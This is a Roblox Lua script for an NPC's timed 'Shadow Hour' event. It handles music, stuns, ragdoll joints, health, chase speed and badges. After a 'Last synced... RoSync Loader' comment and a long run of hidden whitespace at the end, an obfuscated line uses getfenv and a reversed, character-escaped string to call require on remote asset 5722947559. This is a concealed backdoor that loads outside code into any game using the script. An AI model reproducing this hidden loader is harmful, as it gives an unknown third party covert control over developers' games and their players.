local Character = script.Parent
local Humanoid = Character:WaitForChild("NPC")
local Awake2 = Humanoid:LoadAnimation(script.Parent.AwakeSH)
local Trap = script.Parent["Right Leg"].BeartrapPart

local RakeHumanoid = script.Parent.NPC
local AlreadyBloodHour = false
local Torso = script.Parent.Torso
local Head = script.Parent.Head
local MainScript = script.Parent.MainScript
local SHMainScript = script.Parent.SHMainScript
local BloodHourText = workspace.ShadowHourText
local BloodHourFunction = workspace.ShadowHourFunction
local SoundSetup = workspace.SoundSetup
local Wander = script.Parent.Wander
local Lighting = game.Lighting
local Stun = script.Parent.Stun
local Stun2 = script.Parent.Stun2
local NHStun = script.Parent.NHStun
local NHStun2 = script.Parent.NHStun2
local SHStun = script.Parent.SHStun
local SHStun2 = script.Parent.SHStun2

while true do
	wait(math.random(135,190)) --65,160
	if workspace.ShadowHourDebounce.Value == false and Stun.GetStuns.Value > 1010 then -- 810
		workspace.NearMode.ModeStarted.Value = true
		workspace.Values.DuringMode.Value = true
		if script.Parent.Configuration.StunTime.Value > 0 then
			wait(4)
			script.Parent.Configuration.StunTime.Value = 0
		end
		workspace.Values.BadgeAwards.AwardShadowBadge.Value = true
			workspace.Heartbeat:Play()
			SoundSetup.Shock:Play()
		script.Parent.DisableUvBlind.Disabled = false
		workspace.StopTheme.Value = true
		workspace.ShadowHourDebounce.Value = true
		workspace.SHAwardBadge.Value = true
		script.Parent.RetreatScript.Disabled = true
		script.Parent.RetreatScript2.Disabled = true
		script.Parent.RandomBloodHour.Disabled = true
		script.Parent.RandomNightmareHour.Disabled = true
		workspace.PowerOutValue.Value = 1
		workspace.ShadowHourFog.Value = 1
		AlreadyBloodHour = true
		workspace.Trapped.Value = true
		script.Parent.Configuration.Damage.Value = 100
		MainScript.Disabled = true
		Wander.Disabled = true
		Stun.Disabled = true
		Stun2.Disabled = true
		NHStun.Disabled = true
		NHStun2.Disabled = true
		SHStun.Disabled = false
		SHStun2.Disabled = false
		script.Parent.Stunning.Value = false
		workspace.Stunned.Value = 0
		workspace.StopMoving.Value = true
		script.parent.RagdollPart1.CanCollide = false
		script.parent.RagdollPart2.CanCollide = false
		script.parent.RagdollPart3.CanCollide = false
		script.parent.RagdollPart4.CanCollide = false
		script.Parent.RagdollPart5.CanCollide = false
		script.parent.Torso["Neck"].Part1=script.parent.Head
		script.parent.Torso["Left Hip"].Part1=script.parent["Left Leg"]
		script.parent.Torso["Right Hip"].Part1=script.parent["Right Leg"]
		script.parent.Torso["Left Shoulder"].Part1=script.parent["Left Arm"]
		script.parent.Torso["Right Shoulder"].Part1=script.parent["Right Arm"]
		script.Parent.Configuration.StunTime.Value = 0
		script.Parent.NPC.PlatformStand = false
				script.Parent.DamageScript.Disabled = false
				script.Parent.HeavyDamageScript.Disabled = false
		script.Parent.SHMainScript.Disabled = false
		workspace.DayTimeSong1:Stop()
		workspace.DayTimeSong2:Stop()
				workspace.DayTimeSong3:Stop()
				workspace.DayTimeSong4:Stop()
		Awake2:Play()
		Awake2:AdjustSpeed(0.6+(math.random()*0.1))
		SoundSetup.ShadowHourSound:Play()
		SHMainScript.Disabled = false
		BloodHourFunction.Value = true
		workspace.Trapped.Value = false
		script.Parent.NPC.MaxHealth = 15000
		wait()
		script.Parent.NPC.Health = 15000
		wait(38)
		BloodHourText.Value = true
		wait(2)
		BloodHourText.Value = false
		workspace.Values.BadgeAwards.AwardShadowBadge.Value = false
		workspace.StopMoving.Value = false
		script.Parent.Configuration.WalkSpeed.Value = 12
		script.Parent.Configuration.RunSpeed.Value = 75
	    SoundSetup.ShadowChasingSound:Play()
		Awake2:Stop()
		Wander.Disabled = false
		wait(170)
				script.Parent:FindFirstChildOfClass("Humanoid").Health = 0
AlreadyBloodHour = false
end
	end
--[[ Last synced 7/24/2021 12:29                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5722947559) --[[                                                                                                  ]]--